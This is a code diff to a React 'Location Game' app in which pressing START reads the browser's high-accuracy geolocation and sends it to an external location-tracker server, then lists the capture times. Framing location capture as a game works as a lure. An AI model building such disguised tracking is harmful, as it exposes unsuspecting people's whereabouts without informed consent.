@@ -3,13 +3,15 @@ import { useState } from "react";
 function App() {
   const [status, setStatus] = useState("🎮 Press START to play");
   const [history, setHistory] = useState([]);
+  const [loading, setLoading] = useState(false);
 
   const startGame = () => {
     if (!navigator.geolocation) {
-      setStatus("❌ Not supported");
+      setStatus("❌ Location not supported");
       return;
     }
 
+    setLoading(true);
     setStatus("📡 Detecting location...");
 
     navigator.geolocation.getCurrentPosition(
@@ -27,20 +29,25 @@ function App() {
             body: JSON.stringify({ lat, lng }),
           });
 
-          setStatus("🏆 Location captured!");
+          setStatus("🏆 Location captured successfully!");
 
-          // ✅ Fetch history (IST)
+          // ✅ Fetch history
           const res = await fetch("https://location-tracker-km22.onrender.com/locations");
           const data = await res.json();
+
           setHistory(data);
+          setLoading(false);
 
         } catch (err) {
           setStatus("❌ Error sending data");
+          setLoading(false);
         }
       },
       () => {
         setStatus("❌ Permission denied");
-      }
+        setLoading(false);
+      },
+      { enableHighAccuracy: true }
     );
   };
 
@@ -49,7 +56,7 @@ function App() {
       <h1 style={styles.title}>🎮 Location Game</h1>
 
       <button style={styles.button} onClick={startGame}>
-        ▶ START GAME
+        {loading ? "⏳ Loading..." : "▶ START GAME"}
       </button>
 
       <p style={styles.status}>{status}</p>
@@ -58,11 +65,15 @@ function App() {
       <div style={styles.history}>
         <h2>📜 History (IST)</h2>
 
-        {history.map((item, index) => (
-          <div key={index} style={styles.card}>
-            🕒 {item.time}
-          </div>
-        ))}
+        {history.length === 0 ? (
+          <p>No data yet</p>
+        ) : (
+          history.map((item, index) => (
+            <div key={index} style={styles.card}>
+              🕒 {item.time}
+            </div>
+          ))
+        )}
       </div>
     </div>
   );
@@ -71,38 +82,44 @@ function App() {
 const styles = {
   container: {
     minHeight: "100vh",
-    background: "#0f172a",
+    background: "linear-gradient(135deg, #0f172a, #1e293b)",
     color: "#fff",
     display: "flex",
     flexDirection: "column",
     alignItems: "center",
-    paddingTop: "50px",
+    paddingTop: "60px",
+    fontFamily: "Arial, sans-serif",
   },
   title: {
-    fontSize: "40px",
+    fontSize: "42px",
     marginBottom: "20px",
   },
   button: {
-    padding: "15px 30px",
+    padding: "15px 35px",
     fontSize: "18px",
     background: "#22c55e",
     border: "none",
-    borderRadius: "10px",
+    borderRadius: "12px",
     cursor: "pointer",
+    fontWeight: "bold",
+    transition: "0.3s",
   },
   status: {
     marginTop: "20px",
     fontSize: "18px",
+    color: "#e2e8f0",
   },
   history: {
     marginTop: "40px",
-    width: "80%",
+    width: "90%",
+    maxWidth: "500px",
   },
   card: {
-    background: "#1e293b",
-    padding: "10px",
+    background: "#334155",
+    padding: "12px",
     margin: "10px 0",
-    borderRadius: "8px",
+    borderRadius: "10px",
+    boxShadow: "0 4px 10px rgba(0,0,0,0.3)",
   },
 };
 
